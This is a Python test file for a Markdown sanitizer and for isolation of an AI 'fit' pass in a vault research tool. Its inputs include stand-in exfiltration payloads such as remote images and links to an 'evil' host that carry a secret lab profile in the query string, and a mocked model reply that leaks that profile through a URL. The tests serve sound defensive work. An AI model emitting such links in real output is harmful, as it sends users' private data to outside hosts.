"""Run: python test_vault_research_watcher.py  (no dependencies)"""
from unittest import mock

import vault_research_watcher as w

Z = w.ZWSP


def test_sanitize():
    s = w.sanitize_markdown
    # executable plugin blocks are defused, harmless ones kept
    assert s("```dataviewjs\ndv.x()\n```") == "```text\ndv.x()\n```"
    assert s("~~~dataview\nLIST\n~~~") == "~~~text\nLIST\n~~~"
    assert s("```yaml\na: <b>\n```") == "```yaml\na: <b>\n```"          # code content untouched
    # Dataview inline queries
    assert s("x `$= dv.y` z") == f"x `{Z}$= dv.y` z"
    assert s("`= this.file`") == f"`{Z}= this.file`"
    assert s("run `docker ps`") == "run `docker ps`"
    # Templater, everywhere including code
    assert s("<% tp.x %>") == f"<{Z}% tp.x %>"
    assert s("```bash\n<% tp %>\n```") == f"```bash\n<{Z}% tp %>\n```"
    # remote images become links; HTML becomes text; <br> kept
    assert s("![x](https://evil/?d=lab)") == "[x](https://evil/?d=lab)"
    assert s("![a [b]](https://x)") == "[a [b]](https://x)"
    assert s("![a][r]\n[r]: https://x") == "[a][r]\n[r]: https://x"
    assert s("![[Local note]]") == "![[Local note]]"
    assert s('<img src="https://evil">') == '&lt;img src="https://evil">'
    assert s("<iframe src=x></iframe>") == "&lt;iframe src=x>&lt;/iframe>"
    assert s("a<br>b | 1 < 2") == "a<br>b | 1 < 2"
    assert s("inline `<b>` ok") == "inline `<b>` ok"


def test_fit_pass_isolated():
    calls = []

    def fake(prompt, web=True):
        calls.append((prompt, web))
        if web:
            raise AssertionError("fit pass must not use web tools")
        return True, ('```json\n{"fit_verdict": "Trial"}\n```\n## Fit for my lab\n**Fit:** Trial '
                      '[see](https://evil/?d=SECRET-LAB) www.evil.io/x')

    with mock.patch.object(w, "run_claude", fake), \
         mock.patch.object(w, "load_lab_profile", lambda: "SECRET-LAB"):
        meta = {}
        body = w.add_fit_section(meta, "X", "## Summary\nhi\n\n## Open questions\nq")
        research_prompt = w.build_prompt({"name": "X", "url": None, "text": "X"})
    assert meta["fit_verdict"] == "Trial"
    assert body.index("## Fit for my lab") < body.index("## Open questions")
    assert "evil" not in body and "SECRET-LAB" not in body   # no URLs out of the fit run
    assert "SECRET-LAB" in calls[0][0] and calls[0][1] is False
    assert "SECRET-LAB" not in research_prompt           # web run never sees the lab profile


if __name__ == "__main__":
    test_sanitize()
    test_fit_pass_isolated()
    print("ok")
